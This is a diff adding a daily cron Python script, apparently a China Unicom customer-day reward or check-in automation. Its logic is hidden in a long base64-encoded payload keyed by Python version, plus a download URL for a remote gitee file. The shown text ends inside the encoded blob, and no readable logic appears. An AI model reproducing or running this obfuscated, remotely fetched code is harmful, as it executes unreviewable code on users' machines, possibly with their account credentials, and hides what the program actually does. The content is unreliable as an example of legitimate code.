@@ -1,0 +1,266 @@
+# name: 联通客户日2611
+# cron: 0 0 * * *
+import logging
+import asyncio
+import urllib.request
+import platform
+import sys
+import os
+from typing import Tuple, Optional, Dict, Callable, Set
+from dataclasses import dataclass, field
+from functools import wraps
+
+@dataclass
+class Config:
+    SCRIPT_NAME: str = "ltkhr"
+    FUNCTION_NAME: str = "main"
+    DOWNLOAD_URL: str = "https://raw.giteeusercontent.com/kele2233/but/raw/ma/file"
+    CODE_PAYLOADS: Dict[str, str] = field(default_factory=lambda: {
+        "3.0": "fChSVFBhY2tAUkQyAQAARqwd0XvbDmB+pHt6x5s+e117RlpvZVZEQS93b1lSSHJiRS9XcndRcW5JU3NOQWZ6STYxZStRc3h6OWxlaFl6Ny9ETzg3YkpDanVaVnJDT1NaVFVpdUhlWEpqTmdZbXBSbVZ3eW9Fb2MyYlQ1R0lkcUkxRmtEREVybFZYeUhxckMrWjNXeXJGUm52NHh3Z1pzQ2x2YnVxUWYzcmczVDE0dUdzR2JWYlU2clMrRmM3RXloNytQSE56Y25EcVo0b3h4azlBUW03cElLTEd1cXZYWlZqT1RaWDhGOGEyN1pUS2txZjRmdlh0dzgwcTYzSkpJaHhNdW1CQ2Z3UWg2VStvMmhZSmpjUWc3VVZqRTFXYVdrWC9SR3MvM3M5eVZacC8ydE50Tm1oTmZ4QkQ4RDF1RVdaSlNuc2JNVnQ4QmNMZVN6NTdBNDhKeXRkdVF4NU9Gayt2UFlyUy9yalJXQ2ZRTG9IeTByRnlMK3RYWi9YN2J0bE90QlFRK1haT0lDcTBLb3RHbkRkOUZxU1ZUQ0NjazJUMWxOT282b2taaTNyTkNoT2p0TTRHdEcxWmpURHFhemFoclNxV2FzNWZycUlOZE00TEZTWnBGMzFXeloxK0JMbzN6N2VxQmVqR29uUFVYRzdjYVhBMlVDR3VjZ3V6NnpnanZqeDIybTd6N2ZvVjdGZ1crM1Uza1VodWVuZ2p1WmFyblRvai9LL0Iwd01EVlk4d3dXMmVaK1dIZEtSTEZXaTh5QncycnRZVURoSU5xSXR3L1NwTXJrUWR0NjVhbWlheW8wLzBiWm1tYlRTTWIwbU9uU0I1QVhvOGpqTU52eW1ScHVCQ0hZNVlVUk16OFJFRFpxanJFYlF3eHZLUDhnaGMweEhWSDNieDZEamxEUkIvbWdsTjRlZWV5MnBNZmVlWWJXaHpLRlNXNi9zM3RHUG1RR280MFBKbHZDY2Q1S1JJTkxOb0tWTWJhc3Avb25YQlVVV1FiMXFoWERyR1ZXQ2lXSUZRQy9ORll0OWRiMXhLNHlyOXZSRnBVdTZ0UVJiMXNDMHpRSnhOYjdwWW1wQWdpcGVSWUpnSnl4SGpiazF0NzRLOUtJeTlOWGpBMHpMcjJPZjFiOFFBYVgzUFk1d2VHaGpsZk0wRDI3K3FXcE0xSGd5Vi9OV2pkMU1xM3FmZmdhbVRuaHhNQTNlMmpNOUd4dkNCTlpOZWErdHYvdE0vUURlMGd6NDhMVXFtY2hNOTVrMmF2UzZ6Z2pQVzhEbjQ0cCtVdjVYRjhqVzhsV1Y2WVhzQnhxS0ZDQnRZZlB6UkJ3dTR0WE9EandqcStCVlVmQ2VkYXUzcGZzV005NW5HK056eDF1ZTJVQ0Zaazg0YWJzbGF2cEVqTU1xNzZRam1EWmNXMjZWMEp0YUhzenNtWWVHTHFnV212VHpsMTR5WnhpaGxJVVVQMDNBblhpdmptRERkaW9QWGUvT1VSTmRSd3BsSDBVMkE3MmdRd1lVMHlaWDBHd3FmRGEvWUswUEpXSTdXYzJ1UzlTZEd4RFJleExBVU5XQ1BQeUR0OWJ1V280NzNWLzdyTTZ3WldFM0o5T0lIS3pJYWkvWS90VHBHK1lYYkMyNldmZmF3TEJscmdvVG9xQmN3ZW93NWVPME5IdGEyYmxhbkNTUytubmsyM0pwVkNHWEU4KzNiRXh1YVBxZ05XYzcrVlRMT3JPQSt3b3hRUVFhSXFCazdkRzZrRmNJSkgrSDNQZWZsS2RlalZzNTVDTDNlQVEyckR6dkljVERFMldudHJnRGZOZEMrTHlkYWtNN3JON3lLOFVQUGJ6VmIwM3VwaVVETEc2bUMrSHVlcVl2RVVGczc3dXdITnQrRHhnZ241blZpVGdqSGNzYU9wZmZmbVM0cjRIc1BZY3laT25MamIyNHJWWWlGbmFJT1hMbSs4S1RNekxoRWpqZTJhRERNdlltd3RuRktaUXJoWnIvSG82MEtOQjRmclRNZ3FUOU1scHl2ZFVDdGFSU1VRdTRhZkJJeXVTWC9Db1AzYjNEYnhHdDRiQWxGWEl3OWRZWVBGdFBKNURaVUdVUUZkcmZ4QzU0MWVpQ240STR4aEZXMVJPWi8zNkROVUk1d2N4dlhNNzRlZnh2YlFMUmVXRkJWSU05dy9ZdWpXd3hUVlJnWjE1elI5djBhR1RHVTN1Y2V6YU9oV3R2UmUxZmx1YndYUmVHSzJLOS9VRzRlcFdiWUlsQ1RINVo5bGtJL0RZTzVvTUNHaVhyNUxlZFQyYnBWRDlOeGRWcUxIL0U5SWwyNWF4VnJtZ2FicDkxVE8yalZiQ2UzeEJ3ZUI3NzRKeUc4YUpYS0pOc2cyREhPRWl3VUVibWU1RFZ5QTBtMUdaRExpdkxJVWFQVlRSOCtmRSt1eitzYis1c0srMHVvOERCbU1TOHFqaXoxRTNHU29DUDJjMTFnMXRyaDlvTVEzZjVzTFhpZTgydmpvMjgyTmpNRVFaaVFSYllSR2lWV1VaNUpsR1E3NHJLODhwZnd3UEtjUXlSOU45Tkw5MXFmTjlEWDY0TUVDbXA5dmZiSmRkVEsrY1RDZE9MdTZxSm9MSVprTHhnSHUrRWlUNnRaMk9WMDlsZ3lxQkpwcW4zdFB0RmZtNWphM20yZkpUV3pWaENrL0Z3bEsvU1hvdnZ0MnZ5VjlXMnUxVGZkdXl3QVNBbktLTUZjVDZPcFA2NkMrZnE0a2dqaW5yVmoxMk51d3NIN1BmcGgza2FWZ0hkd2tGSVplaWZucWcvL2tOcDBsZmxuNEhtbkIvQWZwajArdTZYY2JSc1JGQ0lZODN5T21jQmlsQjZ5aXovODI1Vnd1K2o4TTlLVUppam4zbHFRcnphNjY3SGpzR3Q3WGhpR2ZZT2VEcFgwck5NK01vWExLZGRWYkV6ek5yTDEzNFBJOGtJY1JBMjE1dnN6aEs3L2dLM0M0dzNCdzU4b3F0NTRmcEtyRzNkMlZ5UzZtVENCOXNRQXp5dXFYSHhPYWRtLzB2TmFQVGJVUE1BZ1Y5azlRc05aTnFhRDN3QVpDVGIvbjQ2ZjM2WVkrcldxNk8vV2NTTTFBdGlnMWpNZTBxL0JmaEdsTTZNRFRHRXVhVXVkTUJYeVJVM3BtNWxmTTdWM2FXM25Qai9Da0FLTjRVSHA5N3Y4VVgrMjFLbHN0Z0FyMEJpMGlzZW5hSEIrYjFnd3pIRzdXM2F3YkV6dm8yRlkrRGxwY1NIRmxKOHJMSE1aV0tUbVcvT1hYcitsSmM0VjRsMG8xdDJsMGxNUFhZTng3Ukk3aWNrUjdCeDNkcnIwVklXTXZzc0pkdFhrQnFaT1JLWkFyS1h3VlB5c204eFBBbmZlbEJDQ0hjMlRRQUJwbGR0VmJyd21VbnNGcmhBOHBmNXhkaDlmdTFxSWx1OVJOMndFM3NRbWMyQ3d4d1VHNlZhRmtCaFNxanpwN0JvRHBrVG1WUFhqVTRycVlzUTJYRHE1WDd2YS9MYzQ5UVdmeU9DcUY2ZFRubWs0cUUyN205M3o1Q1Aram1lVmNocEMrOFhtY3dlcFhuL1dhRDN6Q1JLNFFmd0VuQ2trYlpkaGVEeWZqbTBHSTFkZkNrZW9rOGJCMm5GN0NYdGdSL2c4QzZkc1U0M0VoVU9BSzN1eHoxRHF4VFV0aWZDWEdBbG9SbEpnT09GcEhBL2RVb2hFSU1pYjhCcWxQYlpBMnBXWkdzRTlCUm51cS9uc3lobGk2ZjQxY0JsSmJwV3I3Qzk1RkpLSVUwNkdjYkhsS1k5Z296cHFNM3VuVTZtZ0pLamZ4V0RUSWZVc2tJQ0ZiSVcxRWR5c0pqZ3ZCZlphOHdVdEtid09KNEdpTkFleXZnc05sL1Jad3V6UFNHaXRpN0VQQTdZTUhCbXdYdEZQRXB3ZHd3R3RzVmxKVFEwQ0dMOWFFcVhLcEViUDhYZEJ1TmYrMDRNZ09wcE1VYk4vQnhUOFFLdjEwWEtIcEpYS3plMWVucEZyODF1Q1VkVjloOStTRlJCQ1Z1N0hxMEovK3pjZjJIL2xOUk1SZmloY2d4cmxJUG9WQmJBWnJETEtUMTlEUUdnaUFjZVlFTCsvL2E0eFluUUhHM0hsTHFYMW9MTUVpZEM2Nmc5WXJ6bHZuLzkyZkF3OFNNWWhHQWhjaTEvMk1jcTI1bHlSZmUxZjFlRzBhQkl1NTM4NDBZKzIySnRpcFo1UzZ5VTFkc2JZRURGbHU1bnkyZWJxdUFTRWZYVC83YStUV2hUdllwbDI1VktCSGNkKzE1M09DWUFYeG9KcmIwNFFraUFRR2pRN2FWM0QyTFpVU3l3S21KZXZ1N2hqRXZHendBV2ppNEErYTZxVmdmSnB1dFNqZ0R2RlJtMGZ6VTUzQXJqWEorTm56RHpBdjZReHc3Nk00YlIvUHNiUnFLb2VyZk1mWjlWRTN2ZjlZMXlaVUpWM1dkRnRPUjluWmpmYVJWSGh0STYzSUptcGxMeUMvY2dBZW05Z2ltSDhPVlZsaTViaVlqS0srWm1EUDRFdUd5QjZxRm84NHNKaU1BMmlmSGdsQXlRcHFHa1pWYmxML3Y4d0p2UlFxRHY2RU5WY0g1MWlPT1R6ZzdQNEdUWmNXbUphbTFqRkZRcmpXbVBKbjhGVEFwTWZMSE8wdU1jbmQwRFU3ZmJ1aGx3NEZJblZBZGFrS1h4R3FlOEExclQzRzdGR2htczMvR1Bya3IvT1pMNndrWDlGdFBtMklrK0R0MWVEMndJUVlFMEdWdjVESGY4SGpDY0FYNXZCNjJMdzFrTXJnNHNGWmtWR1NoTFVlR3BsdjltdUFsc3h3VkhhclRxOFdhMGo5YW1jaERtR0NIemJ2Z1JyM2NJNFRCUXdqTzE1SWVqQTFuOUtvQXJLellVNVhVR0VHUWcrdi91V0pHSCtTRHg0MmJCZFI2QWZkc1ZvNktyZTVFc3dXWFFUelB4YUF2TjA1ZC9nWk9ZVTMyMmRxdGxMcUJ4VUMzWGgzR1FydERManlBeE43MlRDdWFVQ2Q0amc5c0JBTmpoMGZ3RXZUaGw1QTFlbHVkWUxtK2w4U09nWlRDR3orL3RsODhpL2JtRDY4Unp5a096REFOdUIxeXIzbDBxOUZ1MGhjY2FteFZ3ZzZ2cWI0cFlyT2ljaHZRR096R1JXbG9CMHZCajd3SmRxSjBGZG1BOG0vT2J4aHVJOFhVWHhaZ3VINjlKMTdKcCtQWll0QlkxbVRIZkJZMC9GVlF2VmxxcDBXNmhJVHU0RTh5TStUcDNkUngybENQVSsyOW0zdXl0TVNoWFprOXY5MXM5OHhPUWNxRGdmUVoyZVBMTFJaaDNVRE40ckU4eEMyeGRGcHN3MU5weWJMNjdSQXlVWTJvam1KM1Y2dE9LKzJjK21VSWtMY1R4K2dPc3JpZGpxOUc1dGF5TVlCYjBDTmNBaGcvdmJWaEVjbFJRYzF1amRWaXJ1eUl4bVNHajNBMzRGdGQwdEhLQ2ZrZy9NdDdpTW1raFhjbnFxYlFxY1oyS3JBY0UvMEdyOTlzZGdKUGFpYVQyWk9VSnprNDg0c0RNNGFvamsyV1JIVmdFTzIrU0diUTQrbk5FSTJXYVE0YnNBTU1FbnlaV0NkUW5sYnU5THFvQi9tVlJya0VmN2hKMisvOVNCM0JiamFJa0xaZ2xjTTZxekUzSDhQVVJ4ZlZXYTh5U2ZFcDlaQTFPUFVQc2pMQjNYRXNQeGRFNVIwdm5FcXN5RDk2b0NKTVdzNU5ndzhXVXZoV2xYN1Q4SlFqeVBSdWNadG9DUDgzazAzbjludGxBWndHUTFYZ2cxYnBneDNuWFREc1UxU3RMS0loSlNqTXpramRuTlBPOVpkWDVuRm8xaEtNNGM4WG9aTUllZDB2SGF1aUFEQ3VTWlVqak9tSi9zRUdzZXJ3eU8vQnNGaGkrUUwzM0lCUm5EUWpYanNDaXhBY0x1TFlTKzlmQzF2TVovd1VEMjlWeDhMN093RDh5V2Mya00zUjJvdUFWcG9FUWJqNzcyd2cvaytTY1FISmRzalpVNUFxYU1POEN4WWdMeVN5Z0ZhTnhLb1VoVGlWWjlzWnptRnFRSFdIOS9vNVU0YXI3alFBdzNwd3IrL0dxVjNDYm1iUVJBRlBlYXpHWDF3WEF0UERNTjJWSTZaa2VrNTByeFVocURuWUJVR3ZSSEhDMk50dXNlT1l6STk4NnRuTzlyRjFVWW1xVEJoWGlEa1FnQitaM1J5WkdMUDd2aHppbmIxbXljNklSOVpVcE5kQ2pGSmRjN05OZHZoRjFQMk4rNUFZSk8rbFFmZ2g3bmJmYitmRDlrb0ZuVlY5SXFJbjRqdnFZazdBSHVYdmtGSzNSU213Tkh0RHB1b1FoOTNweDFweTZSNUJwZys1SGJLeG5tRDd2enRjRzZpai9qN2FOaEVJaGg1SWRORmRkNmZ2aFdTS084WDNkTFR1NHRSTm8zYzRaVmlFVmwrd0RaL1A0a3FCSDFxcW5JbHNQNUtXMzBnSS9Yc29uaWlFQWQzN2dkNUo4dHlEZFBMSVl2Z0hmUHI5UjJoV2tOc3JkcHRCeFJVZ0FPbU1Ub2xDcjlKcG5oNzBTY2VUZks0UDU4K3hmM0JobHA2YjJndk1Mb3NzNW4rc3pVeGRRTC9MdTByM0RORGY0UDlhei9mL01aQm4vc3g4bnZHZ3lualY3alBOWGVnUDA3NFAyRVdDUWZnWk9IL2hMUUlUaDE4dHg2YkZMbTRERWs0MU1aYUQrRTh6aW9IT0p2dkZ0OUUycUZwR2NOenl2MHUyTEc5TnVvUG10Y1dkaC9sYlBaYkJ2K2pXYUd3cjdGODBVWGh4clBBdXowNDN2dDZlQmJRVVVZMDZtS3laWDdlMzA1U3RJeWR5UURHWng2QUdEN083U29mRmJ3VjdwMWMyQjRFSHFtdDlBOWk0VXlQMzkwMTZzaERIdmRNaEpONmtHakZDSThGOXhZOVdka1ZyZE9wNHJTU2dVb2tvN2JESTFDbDNXZ1RCR3ZhY0M0a3g0MFl4cythNGt5VDFYTGYwSjFjRk55d3RVTEY1Z3NKbDJZb0tWSlhsUkpPSkxORG12NDc2N2h4OExQRms4UkQ4UitEYy8ya01TRm5hWWtpbE5vaWhaWXBXbUVhdGZlYVJxM21zL1ZmdmtKNnRSMGF5T3pMV1JhcFpFV0ZSWjFYK2UvK3JSTVZwd2NBY1VWWlk2V0FRQ0Ezc1hOYUxpelNvZzNLNmlPblJaMEQwWHlSK2JsZGxrLzZTc0tZZXlaSFJ2VlZnektYZCswOE1POFdBR2dmY2ZSejRKR09TYUN2S0JYWGZyWUhoTkxYVnJVZFJVcGlNV1Y1RSsreU4rUW9xZFg4dUN1RGdBYXYwOEY1L3VBa1N2T1VtY21LSVZIbCtWQk9rS0lLZzBaMEFTYjM0eXdZZWljSm1hcHMvV2ZoSGY0STUzSEdmc3NXTGd1U2FtUGNDOTFSRFZFQlk1UjFiTThEZ0syRkVlbW5CRlduODZBVDUwUnVGY0JxYXVjaklXRGtGSzFSSk84TndPU1BwTWh4WFdNN0xnRjRpbEJnYStGTjNVSHNoNVMzTmFyOXY2QjJuZm8zTW9OSWkwQ2NiU3hYcEFRK294Sk1HQTI3cnltR2cwc1pkaWZCS2tod3ZMeUFqNExoeGREWUp2MFJYQTF6WDIwMzArc2xVd09OZHNTTkc0VThVd2VwMWIwTS9WR2k2SzRQYXdydUtNUVRYZnpVcmtZVWZHdXBRakNVNjlzVkZ3ZHhMUTJ2RTRubGp6NTJoM3BLMEg2V3cwcmJFSnpLNjhubElINWdOUi80SUg0dnpnZUpFU3VXTmJFQmo2Z0Nhb0hYVjVkSzViUXU0eFNjRUJESllzUEpUeG9ZbFg1bjZHRmFyakh3Nkg5eVdzVDFmSGsyOS9QZmFBclJsLzlxZndCeDB1eVZVUnpEcGN3N0hXS0ZXWTdXbFMwSTluendFNDlvMnFLUEw3VzdFQmhLNm5mK2h2ZWRVR3lHQjFkRXBIeWNSUmMzcWRXREhYT21WS2tLeEd1UlJ0NUNzRHFLaTNrTDNhWm9rTTVCSDl2QWQvWXJ1d2Y0bFcwcjBsM1hHcnJrL0lmTDdGTkR4dUZMQzU2VVZxaE45eUkrYXNRNlZTKzBPZmUyYWpqZHdCTkEzYTRpRG1NZ1R5U2IybGFPYXo2eWZIVXh4UklwemRhcHNFak9Ob1dOejNjNTVYZUpaV05pY05oeEI4cUVNNDh0RW5iRGVnWHN3VnBDMnBEZm1kWkJuNU91TWc3THc3V1dQQk9ETUxpNTBpVm1PVDRRQ2o4Wm5XVGJCVHZoVys3Qnp4eFVlQTdwU1FXNDZWVUJkWjhFMUVqWFlTVDJ0Q1pRUDJKMzcyNDFsbmZjUCtsNGpnZjFQSU5wcVp4QUoxTTZBYnJBZDE5N2RSWUpzRGNuV2Q0K2hqWm5DSWhiZVoyODdKU0VyUXVKOUplYTZhVWFNeVRPYmRMa2tSKzc2aVdZN0Y0N0R3eUxRN0ZDWmtTb1VVWkdDVXAwVC9wdGVGNEJyOG5Rc29kb3NaUndvcEMxYzFKYkZIUmgxYi9ITmhNVVNldmIvNTJuT2RJTTh1Q0MyUWEvMnNGZGdINGFSWEVkTEE2bi9Vc2xGbEZqWGc1eDN5MWJNTk4zTno2NWtUTUZGTGZYQmpQK3JJOXhyWVRTcDIrQzZQVUlKNXRhM01hZ0xzamVzZE1JVS9TUVVGV01jQ2U1OTYxV3FUaTVHMEpxV1F2QWFjWE1rOFVsa0JuQ005QVRVV04vWHNXUjc5ZFBuUlR0UnhERjZUbXp3VXRMS1hzSE5ZUjk2Q3NKTlZhajRlaWp2S3pTSTFLTlc5K0Y0K25NNWpCUWJiZ3Jvdi96STF1S1dVa1Y2Q0lIYUhRYTlqVWQ1NUo2R3kvZVpITmdaY0d2ZEdwUXZXL0l3OUM0azVoaklqcE5IaHFHLzh0c2RFc2pkVzM2WHMwTy9LSXg0ZlRMdTRKbThDUCtZM1lVSDdGY3FmSUswYXNvZlI4cTBwZEE1Z0hsVnExdlQrck1jei8wZVpQaGFsd2dxOXFkZlpsWE1CcVp4dE04ekxZeXRTVU1WK1VuTUdtSjlTMklKY0psV1NLY1k5Z2tkb29NOThxOCtQbzlBTG82YklWck0xNFB6aVBteTdpQmk5Qng0cjVrL29QcnZReVNWM1IvSE9mRUZMTUhNODZNM1grZEx0SmR0QTVtVGkydmFjaVhzc3pmbVFvWTY0emJuWVlOK1ZYYUswV0MxcEZmbldhYmFMZnQ2eUsrT1cwREYxeHkweGNTbUFMSElhU3JoQXpQbjNxY3J4UDU3Qzl6Q2l4azdZRHkwaEEwRDFMV1ZPYlVaRmxzaWJKMHNHRzlQWE5CTHVQU3I2bEdKSE1VaDJFc08wT1o3b2E3dnhlQlB1YkUxcmF3Q3RiRktiRE9xRkhsNEhWd05CYjhzbTlWbUN3Zkl4VUVXL3VjdmFoY0pSNjVjNUZGNGF5aVpBQ0U5S2ZNV05tTW5ncEt5WHpwSVp1NDZKT1UxbVV0d01jYU1yZ2ErRmRLMngrRGtPL3JLV3AzYWh3WDJhSkVxT2pzdXdhWFQ0amthMHIyZjRCTjV6Rmw0aE1MeVVrODZaM0JCNTBBSHN2UllxYVp3cEN6cndOdmt2VkFEdXpxaXoySnlLdG9CeTVjZlo0ZkhZSHJNUU9xQ2xtMThBZW4wMTY4Q2FyZElVNlN6V2Q2VFphRGlZeFJNdkRoRXZXNXJkSmg4MUJuak10RlJOOUNkKy9PMXd3Qkk3cWt4YlRKbWRwNWJzL2dMSG5RcGFuUzlQL3NNQkxPRHZrRzUvUDJmbU1FSk03T2JrR3Y3Y05LbVZHelZLcEtnVjMyUDFrL09KTzNmNElpTFdxM2xoaTU5WUExRXhZNHg1eXlCRzh5U2ZvMjJ6QklEbDNMdGZxTEVCcmtQTmcxVnk4TWpDdUZndlhOOTVWRVBVWlE4Q1JQY05uUXVlSEcyTW5LQ3c3UkVtMU1ad1VYR1RkRTRyYk00aXdIWUxBY1pjUW4reEZxMlVMTHl5MGhyVnhWbHhiQkNLSGtDVDZwbFFwN0J6YUFtUmRVQWVoNmkzbFJEcy9DeWhkWjR2TUtKaGhrdDVRR0FtclBaem05RWVEOWcrWnEzT1J5emJzc0hIL0ZHaXRGelJGVWhha0JsSGxQWjVVZGpoelQ0YS9VdkhmYmdoVVZYQ0lWMDhmSlhEWWJCNEtyc1h5S3RFeko0MzJKcGVBUUVDcjdPZ1dibkJraEhzbUYzSFBQZ2RqSUsyU0lIZXRCcXU5TitrQUxtNC9GWUE2OG0vK1FCVWZLT0xodDg5THNsQlhwcU1OTzFzTTF0YU1VTWhIanhkVFlQdEx2UUtwelBKV2RjeXFaUkRTWXg5MStsd3pHM3VzcHdUeWJxTlJ3ZVEyRCtlaGRINVRHR25hUHgvZTUwd25YZndtc0lnbzVSbmdQamZPSjYvREZpdGNmeEFFeitJMHBRdVI4VHJPOHhCWkxOOE4vZ3kzN0pmQjNJK1ZEWVBJUitKUUV0VGh2ZlZUSlh1NUVkNERvbUVoQ3RoNmo4Ky9vajRrdG5RZ2xieWU5QVViRUZHeWVMREY3YjlHMUdCdS9PdWtUYTBqMGJCdkd1dWlxVWZ1L1E3elFhUzkwWUlSZWN6ZGs2dWVBeVU4TU55ekFWTEliZ3ZyK0lkU1pkVkJsY29Xb1FuV3krN0d2bjNNTmlaazJINFZIS2J0bW05UWh6ZUs5a213Z0J6MytCZjZEVTdNTng4UURZSmJLcEZHUHhUSjB4aFpKaXc5RGNjMUxxQzhodDFvaWZ1N2pqVzI3WGZuL3lqcHk1L2s5NitYTEMzR3hTayt1Y2dEL3p5UnhaVTNRSzVEakRoNjNZaGRIYWZhb3I4a0dkdlBzY0tFcVFQdGJEazVRLzREMkRiM3l4dm9rQzFoUUJBRW80TDJDY29wemlhVzRMWlM0V0lLWnlaZUpvSDg3dW4xZzF2VVNLUmlvaTY5V0NWcEFLZ2R0MkxXMmRBZWVIejFrTEVBRndoQ0g5Z2cxd3BMRSs2YmwxajB1cXJ5OTlwMGtyZ29ua1RRODlEa3dkS3c1REEyZ0lwOVBOd3hHaE8xeTJSN1dQbGx0MTJIVVNWZjFYM0N1VU5IaDVSQnlkdUJLbnZyZGVqTXV1VlNIbFN5OUhFbzU2cGFVdTBQKzhFeDZaQkExY3NoYklIUWRVMDB6SEZvaVlDOHVkVGQ0NTZLSnRWRC9xOUo3N3JtQjlDL0FVUVJhdVV2Zkc3WmlUUTJVWm9HZDQrOWNib1I2VDJGckt5OWlDQmtMRElkVTlBMmZxTlA0UjJlOTQxZHpPY3E3akV2VWxWNUdDK1gyZ2RHVVI4MFpxaHBWMEdUb1VianptYlFBNDRzUEFrRHpWaVZvL3lMTXBUdTRKRldjSW56ZlpqTjZUNG9iQ2c2d3lueVFaRGdoQUhYNGh4eXNraTdFQkNNN3ZndDAvQUtvNjg0RS82a0VldHB1UlJvWm5iR1poUlFmK0hCVHJRS245MlNHOTMxaDQ0MDNDZWNFelo5ZEZGWExPUmMrVkxMVzdyRjVrNDJJMncrcS9uYlNZRWd0SDBkaFU2MURpRGNPTXNEaVF1SjJNdkp1eUhnSVFDY1dkSjhmSGhJMWQyQ01rVitIY1kwVU5KQmZxMSsxYU5nWjRBaUZQRnM2VkgwQnVXY0lJdU9LSkpFbzlvOHI4eVROWXdLMlFtNmdaaVk0VWZkbEs3cjdkaU9LejkzL01YTmFSQUNrd20rdS9vbHdMNzliUlpvYnA2QVdtd0d2bTljRSthZ1lCRXJDaFBNM1VPUE5LbzRJSW9SV1dFbDgrVHkwbjU1N0NHTlpqSlcvRXB3WEJuKzZ2WjgyTDdzTXA1cklNSDJnK0dEKzZlWllQQW1NUWwrb2FFRXF6TXd3eXR1MkFhRHRlY3JXUmxpNnZ2L2JjV2FQREh4YTIxZE0wdHpOZVc3Mm9FME5ZaUtwZlgxOGZ0aXlmSGp6MUlEMGNFSTZlcTJyanAyUWVFQ3NzRDRwSUpDWjg1M05NSDNRZDYrWms5SHMvbEhPMXhvK0MyMUZnVXZYYkFtTUNzWG5DSEcvbGVlaTZNNFVuSis1Yk1mcmRYUUMzamdPbVQxRkNkb1ZacVFiVVY4d1dJZE4rOGJvOUtZMC9YMUZ0bVdodlRDN3k3T1lvQ0UvYlRBK3psWld3cVNLeDVuNFFRZG1RRnV1bXpYZlpZTWhna0Q1cytDM0o5UTRLRE1Jbitab0pnQmFEYzdkSldmNXZPRWFzU2dRME5BU1FjL2pvdnllTGxaV1IwZVhVbkpGM2Q4Rkg4ZXA4RlBjS3hOajdDdHpPWGFHOVpXWFNvQ1E0NzZha0NLNkczaE14Wmt6WU1VQ2JpQ1FFdDE1ZGZsdXJNclRWWmVZUzRQMUp1cU14Um1iZks3Q2xtWW0zR09QMVRGcDhhZUFwWDhtQWRKdXl3aS92aW1SS1BMMGZGU25sTUxjZ3hqMUZtTHFUOGFEWUVtanI1N2JPTVhRbXcveHhRekRlSXROVURmdDNLMk5pWkdXQUxKTTdqbG1ScWRkOTdRSExGYXYzVEN4aHI2ZnRpNEFjT243UlNFYSsyNVZrTTZDb0g2S0xnZkh4K0pnOGNPMG9ZekxBT1JaZDBRK1A2MmpjYTJtd2x3ZndBMG9iRVhuVHB5WEVtT2JIK3o5SG9FYjNBc3g0SkxxMkRDMGZodkIybjVqZnZiM2JNc2VzQ1NnRHFBdktNdVJqSVVuYTBMVlhOTDAra09HVDd2Y0ppbmdSRHgyUjVJYmdNVkJIaUVjVHh0ZXRzVjB0REtTTFRFdUhzU0hXSFlYakhMQUZ0b3R6Mkk3dUtKOS9mWGJwRGRQcnk0UUlLcXAwbHd4cnl5M3h1bTlFT1I3QWo3Z0EyMWU3TVpqK1pHQVBzYm8wcWpnSUVxSkxYOGpNZXRSYnpRQlYvaG1UL3krUlNWZGpuQ2V1WnJ0SThKUHJKMWFweFh4MHdsa1ZjNCtDdjRUZk5xdGJ1bFdYRlR2V1JkM0ZTYW5CbU1Hd3VpbTdCYzJiL1J6NXlkcGFCdFJQRU5IWlBwdlNpZmx5RHRRcEVrR001QnFLOEFFUzNHd2Ztd1NrZjFRcWlURTJpTUJrR1VXZ1JNQXNjRzNCR284djdWV2FvRHVVMjhXOHYwOGp3UjFlSnlKNk9zQXJ1N2swSlBhRnR0MTBRM1IyNjRyRU1QUWdzeFljMU1xK29BVTB0aEIvZENMSndObkpzMXk3NDVKc3FPSUtySWRFblFmR1lCYyt5NVFqYmhwbzhvMGRDV2IwZno3c0xnS2hZcUEwNXRWN0Zjd3MyUDVpSXdad3NDZVB2MThOWDlScW5acmtlL0xZVzZ2UmhVMUdTaUVYTDZBenM0c3dwT3lFWDBPMkVlZlArQVZXVytUbUVyVEpUR0xHTEhLM0w3anBxeVBZZVhkdHVlVVlkTVdwbGNRTi9CbS9PaldHVDZ3YklaOHF3OXpZNFZrV0laaFg5MnV0S3RPMTlvSUJXT0FPQyt0WjlxdmFaY3VhUkluUE9IMjZsVE92dDMwQm5zWUNFNEk3V0ZhN25iZDZQWlZzTWNHWUNBazB1azBaOWNZbGhJZUFueFFJWGNMSWx1aHlyTk1qbE5WTTUxT0JPZXJHQkxBaGpydFdhZ1pyYUJTY0QwanAwbDlsakRuaVFQQUVyYzdVVHg1dFB4bzlubWdCcEl1SHVCVDJDUit5QnYwWTBIMVIyRVg4TXg5UE02T0Z6aXVGL3RqZGJURXBiL2M1UzM4bkRCK3FyNksvazloTjduSTkrZEhLTTd1TEtpd3NzL0RYOU01VHpGUUZVVUdJL0RFbjlTbWREODhNMGhRbndaRDhMQTU0L0cwUDlkbmZVK0pFWitXd2craWpVaE0rdG8vbG8xNVI4cHZsbzlMUnJDbUI5bWQyMnl2MFFiRGJXZ1JoYUhRa1VOZUx1akRlN2l1OTJnWVFjUkVzZ25MUXBYdzc5em0vdzU0dlVnc2t6OGdhNlJ2ZURDdnlhSlJQTExGMk0xMFkvVGRlV2NQSXVVUnd3QzVaQ0dtV3N2Z1EyYThPMDJCdDI2QUJ3R0lHYU5hNFpFcU03Q2Ixc2ZTMjRTMHZwOWZvQi8remUwdVhOMll2NWM1MVNpQURjZ0tBd3RGZHNYTWVuOXdveSsxaUlkSTY3a3F2ZWlLc2pGU1RteDZSV2E3WlV5VFg1NjNhVk9zN3dCNlVYNWxlUFFrU0VVMm1EOE1PeUZmTG1zZ3J0Q2NUSzYrZ29ob1kwSzNLV0dNSkgzdi9DdmNDMWZlUTRJelhCdDNXTnNtMkJBQUo0SFZtTkRJTzR1dFVNaGpJNGh0cGZzYjE1amszRkh2eHprcEdINHZMWnZZeWlsT2tZZEgwNVk2VDZpRkpoZFpHbnNZUUxKa1g1WXhkempVN0o4TllXSitodXJDRDFBUGpaWVdVOHdicnlUdklIRTI2bjMyS1dlcXhsTCtqdlplR3IwTWhPdDZpKzY1d2h3VTg2TzQ0dER1dGw4eTcvbFQvMXovSU5TWG1Hd2dYUDhIcE5uVVIrZGkrMHRCek9aaWV3VElvSEF3Q3J5aDBaNDdqcVNUMXlwZjVLT2dDNU9DMkNUT2dOTnBJM2FzQm1iZ3UxNHkyTFlCTzdJZ0dUTHRtcG9NY3RLN0pqSWRLRjMvM0RrNy9UM1VTMGczTXNmT1FhQzR5dnJNaE9qSWJ5VFFpK0tTL0ZNWlRMZFNiTW11cUhFQ2cvSnRTZDdWTHBuUzZpUTRqU1U2OXBWNjRNTzNuZm9obEdLVjN3cWhPTWxCa1h2VFdXTzEzUnM1QUpoSmtQQTQyWE1KZWJ6cnd5M0tXeldObkRkMGhHRTJqZkxQdW0vcXJ0dTFKLzg4cUgwaUVpOG1mOEdQZ1lFazk4M1RKb3FMNHp0L0ZKRmJFYU